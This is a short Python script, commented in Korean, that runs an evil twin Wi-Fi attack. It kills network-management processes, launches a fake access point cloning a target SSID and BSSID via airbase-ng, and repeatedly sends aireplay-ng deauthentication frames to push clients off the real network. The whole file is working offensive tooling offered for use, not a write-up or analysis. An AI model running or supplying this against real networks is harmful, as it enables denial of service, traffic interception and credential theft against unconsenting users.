import subprocess
import time
import os
import signal

def start_evil_twin(ssid, bssid, channel, interface="wlan0mon"):
    try:
        print(f"[*] Evil Twin 시작 - SSID: {ssid}, BSSID: {bssid}, 채널: {channel}")

        # 방해되는 프로세스 제거
        print("[*] 방해 프로세스 종료 (airmon-ng check kill)...")
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])

        # airbase-ng로 가짜 AP 생성
        airbase_cmd = [
            'sudo', 'airbase-ng',
            '-e', ssid,
            '-c', str(channel),
            '-a', bssid,
            interface
        ]
        print("[*] 가짜 AP 생성 중...")
        airbase_proc = subprocess.Popen(airbase_cmd)
        time.sleep(5)

        print(f"[*] {bssid} 대상 deauth 공격 시작")
        while True:
            subprocess.run([
                'sudo', 'aireplay-ng',
                '--deauth', '10',
                '-a', bssid,
                interface
            ])
            time.sleep(1)

    except KeyboardInterrupt:
        print("[*] Evil Twin 종료 중...")

        if airbase_proc:
            os.kill(airbase_proc.pid, signal.SIGTERM)

    except Exception as e:
        print(f"[!] Evil Twin 공격 중 오류 발생: {e}")
